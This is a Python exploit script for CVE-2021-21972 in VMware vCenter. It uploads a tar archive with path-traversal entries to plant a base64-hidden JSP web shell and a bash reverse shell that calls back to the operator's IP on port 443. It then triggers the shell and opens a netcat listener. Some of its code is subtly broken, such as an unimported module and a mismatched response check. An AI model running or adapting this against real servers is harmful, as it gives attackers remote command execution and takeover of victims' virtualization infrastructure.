#!/usr/bin/python3

import argparse
import requests
import tarfile
import threading
import urllib3
import os
import base64
import sys
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ENDPOINT = '/ui/vropspluginui/rest/services/uploadova'


def check(ip):
    r = requests.get('https://' + ip + ENDPOINT, verify=False, timeout=30)
    if r.status_code == 405:
        print('[+] ' + ip + ' vulnerable to CVE-2021-21972!')
        return True
    else:
        print('[-] ' + ip + ' not vulnerable to CVE-2021-21972. Response code: ' + str(r.status_code) + '.')
        return False

def make_traversal_path(path="/usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/37/0/h5ngc.war/resources/shell2.jsp", level=5, os="unix"):
    if os == "win":
        traversal = ".." + "\\"
        fullpath = traversal*level + path
        return fullpath.replace('/', '\\').replace('\\\\', '\\') 
    else:
        traversal = ".." + "/"
        fullpath = traversal*level + path
        return fullpath.replace('\\', '/').replace('//', '/')

def archive(localip):
    # shell2.jsp
    backdoor = "PGZvcm0gbWV0aG9kPSJHRVQiIGFjdGlvbj0iIj4KCTxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjbWQiIC8+Cgk8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRXhlYyEiIC8+CjwvZm9ybT4gPCUhCnB1YmxpYyBTdHJpbmcgZXNjKFN0cmluZyBzdHIpewoJU3RyaW5nQnVmZmVyIHNiID0gbmV3IFN0cmluZ0J1ZmZlcigpOwoJZm9yKGNoYXIgYyA6IHN0ci50b0NoYXJBcnJheSgpKQoJCWlmKCBjID49ICcwJyAmJiBjIDw9ICc5JyB8fCBjID49ICdBJyAmJiBjIDw9ICdaJyB8fCBjID49ICdhJyAmJiBjIDw9ICd6JyB8fCBjID09ICcgJyApCgkJCXNiLmFwcGVuZCggYyApOwoJCWVsc2UKCQkJc2IuYXBwZW5kKCImIyIrKGludCkoYyYweGZmKSsiOyIpOwoJcmV0dXJuIHNiLnRvU3RyaW5nKCk7Cn0gJT48JQpTdHJpbmcgY21kID0gcmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpOwppZiAoIGNtZCAhPSBudWxsKSB7CglvdXQucHJpbnRsbigiPHByZT5Db21tYW5kIHdhczogPGI+Iitlc2MoY21kKSsiPC9iPlxuIik7CglqYXZhLmlvLkRhdGFJbnB1dFN0cmVhbSBpbiA9IG5ldyBqYXZhLmlvLkRhdGFJbnB1dFN0cmVhbShSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKGNtZCkuZ2V0SW5wdXRTdHJlYW0oKSk7CglTdHJpbmcgbGluZSA9IGluLnJlYWRMaW5lKCk7Cgl3aGlsZSggbGluZSAhPSBudWxsICl7CgkJb3V0LnByaW50bG4oZXNjKGxpbmUpKTsKCQlsaW5lID0gaW4ucmVhZExpbmUoKTsKCX0KCW91dC5wcmludGxuKCI8L3ByZT4iKTsKfSAlPg=="
    backdoor = base64.b64decode(backdoor).decode('utf-8')
    f = open("shell2.jsp", "w")
    f.write(backdoor)
    f.close()
    # reverse.sh 
    # After decoding overwrite string 'CUSTOM_IP' for local IP 
    shell = "IyEvYmluL2Jhc2gKYmFzaCAtaSA+JiAvZGV2L3RjcC9DVVNUT01fSVAvNDQzIDA+JjE="
    shell = base64.b64decode(shell).decode('utf-8')
    shell = shell.replace('CUSTOM_IP',localip)
    f = open("reverse.sh", "w")
    f.write(shell)
    f.close()
    # Move on with the payload
    tarf = tarfile.open('exploit.tar', 'w')
    fullpath = make_traversal_path()
    print('[+] Adding web backdoor to archive')
    tarf.add("shell2.jsp", fullpath)
    # I figured maybe we can add the second payload simultaneously and still it will work.
    fullpath = make_traversal_path("tmp/reverse.sh")
    print('[+] Adding bash backdoor to archive')
    tarf.add("reverse.sh", fullpath)
    tarf.close()
    # clean up a little bit
    os.unlink("reverse.sh")
    os.unlink("shell2.jsp")
    print('[+] Wrote exploit.tar on local filesystem')

def post(ip):
    r = requests.post('https://' + ip + ENDPOINT, files={'uploadFile':open('exploit.tar', 'rb')}, verify=False, timeout=30)
    if r.status_code == 200 and r.text == 'SUCCESS':
        print('[+] File uploaded successfully')
        return True
    else:
        print('[-] File failed to upload the archive. The service may not have permissions for the specified path')
        print('[-] Status Code: ' + str(r.status_code) + ', Response:\n' + r.text)
    return False

def testshell(ip):
    print('[*] Looking for shell...')
    shell_path = "/ui/resources/shell2.jsp?cmd=uname+-a"
    r = requests.get('https://' + ip + shell_path, verify=False, timeout=30)
    if r.status_code == 200:
        print('[+] Shell was found!.')
        response = r.text
        if "Command found" in response:
            print('[+] Shell is responsive.')
            try:
                response = re.findall("b>(.+)</", response)[0]
                print('$>uname -a')
                print(response)
            except:
                pass
            return True
    else:
        print('[-] Sorry. Shell was not found.')
        print('[-] Status Code: ' + str(r.status_code) + ', Response:\n' + r.text)
    return False

def opendoor(url):
    time.sleep(3)
    print('[*] Executing command.')
    requests.get(url, verify=False, timeout=1800)
	
def executebackdoor(ip, localip):
    url = "https://" + ip + "/ui/resources/shell2.jsp?cmd=bash%20/tmp/reverse.sh"
    t = threading.Thread(target=opendoor, args=(url))
    t.start()
    print('[*] Setting up socket ' + localip + ':443')
    os.system('nc -lnvp 443')

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='The IP address of the target', required=True)
    parser.add_argument('-l', '--local', help='Your local IP', required=True)
    args = parser.parse_args()
    if len(sys.argv)== 1:
        parser.print_help(sys.stderr)
        sys.exit(1)
    vulnerable = check(args.target)
    if vulnerable and (args.target and args.local):
        archive(args.local)
        uploaded = post(args.target)
        if uploaded:
            tested = testshell(args.target)
            if tested:
                executebackdoor(args.target, args.local)
    print ("[*] Bye!")
